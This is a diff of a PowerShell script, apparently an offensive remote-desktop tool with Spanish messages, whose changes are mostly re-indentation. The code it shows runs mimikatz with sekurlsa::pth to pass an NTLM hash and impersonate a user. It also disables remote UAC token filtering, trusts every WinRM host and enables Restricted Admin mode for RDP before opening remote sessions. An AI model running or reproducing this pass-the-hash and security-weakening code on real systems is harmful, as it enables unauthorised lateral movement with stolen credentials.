@@ -148,16 +148,17 @@ function EnableTLS {
         
       } until ($input -in '1','2','3','4')
 
-$Host.UI.RawUI.ForegroundColor = 'Gray'
-if(Test-Path variable:PassTheHash) { powershell $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell exit"
-del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" ; Write-Host ""}
-else { Write-Host ""
-$credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
-$RDP = New-PSSession -Computer $computer -credential $credential }
-$Host.UI.RawUI.ForegroundColor = 'Yellow'
-Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
-Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
-winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
+   $Host.UI.RawUI.ForegroundColor = 'Gray'
+   if(Test-Path variable:PassTheHash) { $cmd = "privilege::debug token::elevate 'sekurlsa::pth` /user:$user` /domain:$domain` /ntlm:$ntlmpass` /run:powershell' exit"
+   powershell $mimipath\mimikatz.exe $cmd ; del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" ; Write-Host ""}
+   else { Write-Host ""
+   $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
+   $RDP = New-PSSession -Computer $computer -credential $credential }
+       
+   $Host.UI.RawUI.ForegroundColor = 'Yellow'
+   Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
+   Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord
+   winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
 
    do { 
         Write-Host ""
@@ -198,8 +199,8 @@ winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Forc
     REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 1> $null
     Write-Host "Detectando versión del sistema operativo.." -ForegroundColor Magenta }
 
-$version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
-$Host.UI.RawUI.ForegroundColor = 'Gray'
+    $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()}
+    $Host.UI.RawUI.ForegroundColor = 'Gray'
 
     if($version -Like '*Server*') {
         Write-Host ""
